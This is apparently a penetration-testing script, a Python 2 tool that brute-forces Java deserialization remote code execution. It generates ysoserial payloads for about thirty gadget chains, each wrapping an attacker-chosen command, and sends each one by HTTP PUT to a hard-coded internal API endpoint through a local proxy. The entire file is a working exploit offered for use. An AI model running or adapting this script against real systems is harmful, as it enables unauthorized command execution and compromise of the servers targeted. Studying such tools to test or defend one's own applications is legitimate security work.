import requests,time
import base64
import os
import re,argparse


parser = argparse.ArgumentParser(description='Java Deserization Brute Force')
parser.add_argument("--targetI",  type=str,required=False,
                    help="target IP")
parser.add_argument("--command",
                    default='cmd /c calc.exe', type=str, 
                    help="Command")
args = parser.parse_args()

ysoserialpath="/root/Desktop/ysoserial-master-SNAPSHOT.jar"

payloads = ['BeanShell1', 'C3PO', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2',
            'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'FileUpload1', 'Groovy1',
            'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JRMPListener', 'JSON1', 'JavassistWeld1', 'Jdk7u21',
            'MozillaRhino1', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'URLDNS', 'Vaadin1', 'Wicket1']


def generatepayload(cmd):
	for payload in payloads:
		command = os.popen('java -jar '+ysoserialpath+ ' ' + payload + ' "' + cmd + '"')
        	result = command.read()
		#print payload+" : \n" +result +"\nFinito"
        	command.close()
        	encoded = base64.b64encode(result)
		#return (result)
		url = "http://172.16.37.208:4200/api/book/"
		headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/octet-stream", "Origin": "http://localhost:1234", "Connection": "close", "Referer": "http://localhost:1234/book"}
		data = result
		res=requests.put(url, headers=headers, data=data, proxies={'http': 'http://127.0.0.1:9090'})
		print res.content
		time.sleep(2)
generatepayload(args.command)




